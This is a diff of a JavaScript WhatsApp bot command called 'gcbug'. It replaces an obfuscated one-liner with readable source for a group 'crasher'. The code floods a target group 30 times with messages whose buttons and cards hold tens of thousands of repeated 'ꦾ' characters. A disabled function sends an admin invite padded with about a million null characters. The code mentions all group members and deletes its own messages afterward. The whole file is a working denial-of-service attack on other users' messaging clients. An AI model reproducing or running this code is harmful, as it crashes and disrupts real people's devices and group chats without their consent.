@@ -1,1 +1,354 @@
-(function(_0x474782,_0x4fa3c2){const _0x581053=_0xd2b7,_0x55cc53=_0x474782();while(!![]){try{const _0x40664e=-parseInt(_0x581053(0x1db))/0x1+-parseInt(_0x581053(0x1d9))/0x2*(parseInt(_0x581053(0x1dc))/0x3)+-parseInt(_0x581053(0x1e0))/0x4+parseInt(_0x581053(0x1fd))/0x5+parseInt(_0x581053(0x1ec))/0x6+-parseInt(_0x581053(0x1e9))/0x7+parseInt(_0x581053(0x1e4))/0x8*(parseInt(_0x581053(0x1e2))/0x9);if(_0x40664e===_0x4fa3c2)break;else _0x55cc53['push'](_0x55cc53['shift']());}catch(_0x17084c){_0x55cc53['push'](_0x55cc53['shift']());}}}(_0x3a2c,0x7a29e));import _0x433cd7 from'../commands/bug.js';async function bug1(_0x3fd068,_0x5820c9,_0x10a55f){const _0x47bec3=_0xd2b7,_0x279384=_0x10a55f;await _0x5820c9[_0x47bec3(0x1df)](_0x279384,{'adminInvite':{'jid':_0x47bec3(0x1e1),'name':'✘\x20Dev\x20Senku\x20Crasher\x20✘'+'\x00'['repeat'](0xf9060),'caption':'Just\x20Another\x20Dev\x20On\x20The\x20Internet','expiration':Date[_0x47bec3(0x1f2)]()+0x6c258c00}});}async function clear(_0x5baa52,_0x1de49c){const _0x20cd8c=_0xd2b7,_0x571081=_0x5baa52[_0x20cd8c(0x1de)][_0x20cd8c(0x1f4)];await _0x1de49c[_0x20cd8c(0x1e5)]({'delete':!![],'lastMessages':[{'key':_0x5baa52[_0x20cd8c(0x1de)],'messageTimestamp':_0x5baa52[_0x20cd8c(0x1e3)]}]},_0x571081);}function _0xd2b7(_0x41132c,_0x5f3fef){const _0x3a2cee=_0x3a2c();return _0xd2b7=function(_0xd2b714,_0x4e48bc){_0xd2b714=_0xd2b714-0x1d2;let _0x5cd67f=_0x3a2cee[_0xd2b714];return _0x5cd67f;},_0xd2b7(_0x41132c,_0x5f3fef);}function _0x3a2c(){const _0x16da32=['20dGMzzu','>\x20_*Attempting\x20to\x20bug\x20the\x20group.....*_','772062CWZkbd','205263aCjFFo','I\x20love\x20you\x20🌹','key','sendMessage','1118920HymFOC','120363298524333143@newsletter','9KULDfT','messageTimestamp','15555824gagXLE','chatModify','Te\x20amo\x20','stringify','info','5001612TYsppK','length','cta_url','192648zFcyOC','conversation','message','I\x20love\x20you\x20','trim','>\x20_*','now','extendedTextMessage','remoteJid','repeat','>\x20_*This\x20is\x20not\x20a\x20group\x20chat,\x20use\x20the\x20bug\x20in\x20a\x20group\x20chat\x20or\x20bug\x20by\x20specifying\x20the\x20group\x20id.*_','☥\x20Dev\x20Senku\x20Crasher\x20☥','endsWith','groupMetadata','refresh','https://example.com','@g.us','4871570bGLVUP','✘\x20Dev\x20Senku\x20Crasher\x20✘','4.png','quick_reply','participants','slice','Je\x20t\x27aime\x20','Just\x20another\x20dev\x20on\x20the\x20internet','split'];_0x3a2c=function(){return _0x16da32;};return _0x3a2c();}async function bug2(_0x218b40,_0x1c028f,_0x3e2f43){const _0x2babe5=_0xd2b7,_0x4dee79=_0x3e2f43,_0x402b41=await _0x1c028f[_0x2babe5(0x1f9)](_0x3e2f43),_0x1647cd=_0x402b41[_0x2babe5(0x1d4)]['map'](_0x58b3de=>_0x58b3de['id']);await _0x1c028f[_0x2babe5(0x1df)](_0x4dee79,{'image':{'url':_0x2babe5(0x1d2)},'caption':_0x2babe5(0x1f7),'footer':'☥\x20I\x20love\x20you\x20🌹\x20☥','media':!![],'interactiveButtons':[{'name':'quick_reply','buttonParamsJson':JSON[_0x2babe5(0x1e7)]({'display_text':_0x2babe5(0x1ef)+'ꦾ'['repeat'](0x7148)+'\x0a\x0a','id':_0x2babe5(0x1fa)})},{'name':_0x2babe5(0x1d3),'buttonParamsJson':JSON[_0x2babe5(0x1e7)]({'display_text':_0x2babe5(0x1d6)+'ꦾ'[_0x2babe5(0x1f5)](0x7148)+'\x0a\x0a','id':_0x2babe5(0x1e8)})},{'name':_0x2babe5(0x1eb),'buttonParamsJson':JSON[_0x2babe5(0x1e7)]({'display_text':_0x2babe5(0x1e6)+'ꦾ'[_0x2babe5(0x1f5)](0x7148)+'\x0a\x0a','url':_0x2babe5(0x1fb)})}]},{'quoted':_0x218b40,'mentions':_0x1647cd});}async function bug3(_0x4a9c87,_0x478e2c,_0x27d953){const _0x2faf04=_0xd2b7,_0x368207=_0x27d953,_0x2bd805='ꦾ'[_0x2faf04(0x1f5)](0x7d0),_0x29a25a=await _0x478e2c['sendMessage'](_0x368207,{'text':_0x2faf04(0x1fe),'footer':_0x2faf04(0x1dd),'cards':[{'image':{'url':_0x2faf04(0x1d2)},'title':_0x2faf04(0x1fe),'caption':'Just\x20another\x20dev\x20on\x20the\x20internet','footer':'I\x20love\x20you\x20🌹','buttons':[{'name':_0x2faf04(0x1d3),'buttonParamsJson':JSON[_0x2faf04(0x1e7)]({'display_text':_0x2bd805,'id':'ID'})},{'name':_0x2faf04(0x1d3),'buttonParamsJson':JSON[_0x2faf04(0x1e7)]({'display_text':_0x2bd805,'id':'ID'})},{'name':_0x2faf04(0x1d3),'buttonParamsJson':JSON[_0x2faf04(0x1e7)]({'display_text':_0x2bd805,'id':'ID'})}]},{'image':{'url':_0x2faf04(0x1d2)},'title':_0x2faf04(0x1fe),'caption':_0x2faf04(0x1d7),'footer':_0x2faf04(0x1dd),'buttons':[{'name':'quick_reply','buttonParamsJson':JSON[_0x2faf04(0x1e7)]({'display_text':_0x2bd805,'id':'ID'})},{'name':_0x2faf04(0x1d3),'buttonParamsJson':JSON[_0x2faf04(0x1e7)]({'display_text':_0x2bd805,'id':'ID'})},{'name':'quick_reply','buttonParamsJson':JSON[_0x2faf04(0x1e7)]({'display_text':_0x2bd805,'id':'ID'})}]},{'image':{'url':_0x2faf04(0x1d2)},'title':_0x2faf04(0x1fe),'caption':'Just\x20another\x20dev\x20on\x20the\x20internet','footer':'I\x20love\x20you\x20🌹','buttons':[{'name':_0x2faf04(0x1d3),'buttonParamsJson':JSON[_0x2faf04(0x1e7)]({'display_text':_0x2bd805,'id':'ID'})},{'name':_0x2faf04(0x1d3),'buttonParamsJson':JSON[_0x2faf04(0x1e7)]({'display_text':_0x2bd805,'id':'ID'})},{'name':_0x2faf04(0x1d3),'buttonParamsJson':JSON[_0x2faf04(0x1e7)]({'display_text':_0x2bd805,'id':'ID'})}]}]},{'quoted':_0x4a9c87});return _0x29a25a;}async function gcbug(_0x324d17,_0x32c31f){const _0xd8a3ed=_0xd2b7,_0xb3a3f0=_0x324d17['key'][_0xd8a3ed(0x1f4)];let _0x171a70;const _0x2aab2d=_0x324d17[_0xd8a3ed(0x1ee)]?.[_0xd8a3ed(0x1f3)]?.['text']||_0x324d17[_0xd8a3ed(0x1ee)]?.[_0xd8a3ed(0x1ed)]||'',_0x3f57dc=_0x2aab2d[_0xd8a3ed(0x1d5)](0x1)[_0xd8a3ed(0x1f0)](),_0x14dad1=_0x3f57dc[_0xd8a3ed(0x1d8)](/\s+/),_0x3cff66=_0x14dad1[_0xd8a3ed(0x1d5)](0x1);if(_0x3cff66[_0xd8a3ed(0x1ea)]>0x0)_0x3cff66[0x0][_0xd8a3ed(0x1f8)](_0xd8a3ed(0x1fc))?(await _0x32c31f['sendMessage'](_0xb3a3f0,{'text':_0xd8a3ed(0x1da),'quoted':_0x324d17}),_0x171a70=_0x3cff66[0x0]):await _0x32c31f['sendMessage'](_0xb3a3f0,{'text':_0xd8a3ed(0x1f1)+_0x3cff66+'\x20is\x20not\x20a\x20valid\x20group\x20id,\x20use\x20.gcid\x20to\x20get\x20group\x20id\x20and\x20copy\x20it.\x20Make\x20sure\x20it\x20end\x27s\x20with\x20@g.us*_','quoted':_0x324d17});else{if(_0xb3a3f0[_0xd8a3ed(0x1f8)]('@g.us'))_0x171a70=_0xb3a3f0;else{await _0x32c31f[_0xd8a3ed(0x1df)](_0xb3a3f0,{'text':_0xd8a3ed(0x1f6),'quoted':_0x324d17});return;}}for(let _0x215349=0x0;_0x215349<0x1e;_0x215349++){await bug2(_0x324d17,_0x32c31f,_0x171a70),await bug3(_0x324d17,_0x32c31f,_0x171a70);const _0x49006b=await bug3(_0x324d17,_0x32c31f,_0x171a70);await clear(_0x49006b,_0x32c31f),await new Promise(_0x21544a=>setTimeout(_0x21544a,0x7d0));}}export default gcbug;
+import channelSender from '../commands/channelSender.js'
+
+async function bug1(message, client, target) {
+
+    const remoteJid = target;
+
+    await client.sendMessage(remoteJid, 
+
+           {
+              adminInvite: {
+
+                       jid: `120363298524333143@newsletter`,
+
+                       name: "✘ Dev Senku Crasher ✘" + "\u0000".repeat(1020000),  
+
+                       caption: "Just Another Dev On The Internet", // Additional information
+
+                       expiration: Date.now() + 1814400000, // Expiration time in seconds (example: 86400 for 24 hours)
+
+               },
+          }
+      )
+
+    }
+
+async function clear(message, client){
+
+    const remoteJid = message.key.remoteJid;
+
+    await client.chatModify({
+
+        delete: true,
+
+        lastMessages: [
+            {
+                key: message.key,
+
+                messageTimestamp: message.messageTimestamp
+            }
+        ]
+    },
+
+    remoteJid
+
+)}
+
+async function bug2(message, client, target) {
+
+  const remoteJid = target;
+
+  const groupMetadata= await client.groupMetadata(target);
+
+  const participants = groupMetadata.participants.map(user => user.id);
+
+  await client.sendMessage(
+
+    remoteJid,
+    {
+      image: { url: "4.png" }, // Replace with local or hosted image
+
+      caption: "☥ Dev Senku Crasher ☥",
+
+      footer: "☥  🌹 ☥",
+
+      media: true,
+
+      interactiveButtons: [
+
+        {
+          name: "quick_reply",
+          buttonParamsJson: JSON.stringify({
+            display_text: `🌹 ${"ꦾ".repeat(29000)}\n\n`,
+            id: "refresh"
+          })
+        },
+        {
+          name: "quick_reply",
+          buttonParamsJson: JSON.stringify({
+            display_text: `Je t'aime ${"ꦾ".repeat(29000)}\n\n`,
+            id: "info"
+          })
+        },
+        {
+          name: "cta_url",
+          buttonParamsJson: JSON.stringify({
+            display_text: `Te amo ${"ꦾ".repeat(29000)}\n\n`,
+            url: "https://example.com"
+          })
+        },
+
+      ]
+    },
+    {
+      quoted: message,
+       mentions: participants
+    },
+
+    
+
+  );
+}
+
+
+async function bug3(message, client, target) {
+
+  const remoteJid = target;
+
+  const virus = "ꦾ".repeat(2000);
+
+  const lastBug = await client.sendMessage(
+
+    remoteJid,
+
+    {
+        text: "✘ Dev Senku Crasher ✘",
+
+        footer: "🌹 🌹",
+
+        cards: [
+
+           {
+              image: { url: '4.png' }, // or buffer,
+
+              title: '✘ Dev Senku Crasher ✘',
+
+              caption: 'Just another dev on the internet',
+
+              footer: "🌹 🌹",
+
+              buttons: [
+
+                  {
+                      name: "quick_reply",
+
+                      buttonParamsJson: JSON.stringify({
+
+                         display_text: virus,
+
+
+                         id: "ID"
+
+                      })
+                  },
+                  {
+                      name: "quick_reply",
+
+                      buttonParamsJson: JSON.stringify({
+
+                         display_text: virus,
+
+                         id: "ID"
+                      })
+                  },
+
+                  {
+                      name: "quick_reply",
+
+                      buttonParamsJson: JSON.stringify({
+
+                         display_text: virus,
+
+                         id: "ID"
+
+                      })
+                  },
+              ]
+           },
+           {
+              image: { url: '4.png' }, // or buffer,
+
+              title: '✘ Dev Senku Crasher ✘',
+
+              caption: 'Just another dev on the internet',
+
+              footer: "🌹 🌹",
+
+              buttons: [
+
+                  {
+                      name: "quick_reply",
+
+                      buttonParamsJson: JSON.stringify({
+
+                         display_text: virus,
+
+
+                         id: "ID"
+
+                      })
+                  },
+                  {
+                      name: "quick_reply",
+
+                      buttonParamsJson: JSON.stringify({
+
+                         display_text: virus,
+
+                         id: "ID"
+                      })
+                  },
+
+                  {
+                      name: "quick_reply",
+
+                      buttonParamsJson: JSON.stringify({
+
+                         display_text: virus,
+
+                         id: "ID"
+
+                      })
+                  },
+              ]
+           },
+           {
+              image: { url: '4.png' }, // or buffer,
+
+              title: '✘ Dev Senku Crasher ✘',
+
+              caption: 'Just another dev on the internet',
+
+              footer: "🌹 🌹",
+
+              buttons: [
+
+                  {
+                      name: "quick_reply",
+
+                      buttonParamsJson: JSON.stringify({
+
+                         display_text: virus,
+
+
+                         id: "ID"
+
+                      })
+                  },
+                  {
+                      name: "quick_reply",
+
+                      buttonParamsJson: JSON.stringify({
+
+                         display_text: virus,
+
+                         id: "ID"
+                      })
+                  },
+
+                  {
+                      name: "quick_reply",
+
+                      buttonParamsJson: JSON.stringify({
+
+                         display_text: virus,
+
+                         id: "ID"
+
+                      })
+                  },
+              ]
+           }
+
+        ]
+    },
+
+    { quoted : message }
+)   
+
+  return lastBug;
+
+
+}
+
+async function gcbug(message, client) {
+
+    const remoteJid = message.key.remoteJid;
+
+    let target;
+
+    const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';
+
+    const commandAndArgs = messageBody.slice(1).trim(); // Remove prefix and trim
+        
+    const parts = commandAndArgs.split(/\s+/);
+    
+    const args = parts.slice(1); // Extract arguments
+
+    if (args.length > 0) {
+
+            if (args[0].endsWith("@g.us")) {
+
+                await client.sendMessage(remoteJid, {
+
+                    text: `> _*Attempting to bug the group.....*_`,
+
+                    quoted: message
+                })
+
+                target = args[0];
+
+            } else{
+
+                await client.sendMessage(remoteJid, {
+
+                    text: `> _*${args} is not a valid group id, use .gcid to get group id and copy it. Make sure it end's with @g.us*_`,
+
+                    quoted: message
+                })
+            }
+
+
+
+    } else{
+
+            if (remoteJid.endsWith("@g.us")) {
+
+               
+                target = remoteJid;
+
+            } else {
+
+                await client.sendMessage(remoteJid, {
+
+                    text: `> _*This is not a group chat, use the bug in a group chat or bug by specifying the group id.*_`,
+
+                    quoted: message
+                })
+
+                return;
+
+            }
+        }
+
+    for (let i = 0; i < 30; i++) {
+
+            //await bug1(message, client, target);
+
+            await bug2(message, client, target);
+        
+        	await bug3(message, client, target);
+
+            const msg = await bug3(message, client, target);
+
+            await clear(msg, client);
+
+            await new Promise(resolve => setTimeout(resolve, 2000));
+
+    }
+
+
+}
+    // body...
+
+export default gcbug;
